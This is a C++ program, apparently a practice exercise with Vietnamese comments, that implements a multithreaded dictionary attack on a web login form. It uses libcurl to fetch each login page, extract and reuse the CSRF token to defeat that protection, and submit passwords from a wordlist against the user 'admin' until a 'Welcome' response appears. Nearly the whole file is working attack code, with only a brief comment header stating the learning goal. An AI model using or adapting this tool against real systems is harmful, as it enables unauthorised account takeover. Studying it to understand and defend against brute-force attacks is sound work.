//Thử thách 2: Script "Kiểm tra mật khẩu yếu" (Simple Brute Force)
//Bài này giúp bạn hiểu cách các cuộc tấn công từ điển (Dictionary Attack) hoạt động.
//Ngữ cảnh: Bạn có một form đăng nhập đơn giản (chỉ cần username và password).

//Nhiệm vụ:
//Viết script gửi yêu cầu HTTP POST đến trang đăng nhập.
//Sử dụng một danh sách mật khẩu phổ biến (ví dụ: 123456, password, admin123...).
//Script phải tự động điền mật khẩu vào form và gửi đi.
//Dựa vào nội dung trả về của trang web (ví dụ: nếu thấy chữ "Welcome" thay vì "Invalid"), 
//script sẽ thông báo đã tìm ra mật khẩu đúng.
//vượt qua CSRF Token
//tăng tốc bằng cách sử dụng đa luồng

#include <fstream>
#include <vector>
#include <thread>
#include <mutex>
#include <queue>
#include <curl/curl.h>
#include <regex>
#include <iostream>

using namespace std;

queue<string> password_queue;
mutex mtx;
bool found = false;
string final_password = "";

size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
	((string*)userp)->append((char*)contents, size * nmemb);
	return size * nmemb;
}

string extract_token(string html) {
	smatch match;
	regex token_regex("name=\"csrf_token\" value=\"([^\"]+)\"");
	if(regex_search(html, match, token_regex)) return match[1];
	return "";
}

void worker(string url, string username) {
	CURL* curl = curl_easy_init();
	if(!curl) return;
	
	curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "");
	
	while(true) {
		string password;
		{
			lock_guard<mutex> lock(mtx);
			if(password_queue.empty() || found) break;
			password = password_queue.front();
			password_queue.pop();
		}
		
		string login_page;
		curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
		curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &login_page);
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
		curl_easy_perform(curl);
		
		string token = extract_token(login_page);
		
		//try password
		string response;
		string post_data = "username=" + username + "&password=" + password + "&csrf_token=" + token;
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data.c_str());
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
		curl_easy_perform(curl);
		
		if(response.find("Welcome") != string::npos) {
			lock_guard<mutex> lock(mtx);
			found = true;
			final_password = password;
			cout << "\n[+++] Successfully! Password had found: " << password << endl;
		} else {
			cout << "." << flush;
		}
	}
	curl_easy_cleanup(curl);
}

int main() {
	string url = "http://localhost/login.php";
	string username = "admin";
	int num_threads = 10;
	
	//read password in queue
	ifstream file("listPassword.txt");
	string line;
	while(getline(file, line)) password_queue.push(line);
	file.close();
	
	cout << "[*] running " << num_threads << " thread..." << endl;
	
	//create threads
	vector<thread> threads;
	for(int i = 0; i < num_threads; ++i) {
		threads.push_back(thread(worker, url, username));
	}
	
	//waiting threads complele
	for(auto& t : threads) {
		t.join();
	}
	
	if(!found) {
		cout << "\n[-] Do not found password in list." << endl;
	}
	
	return 0;
}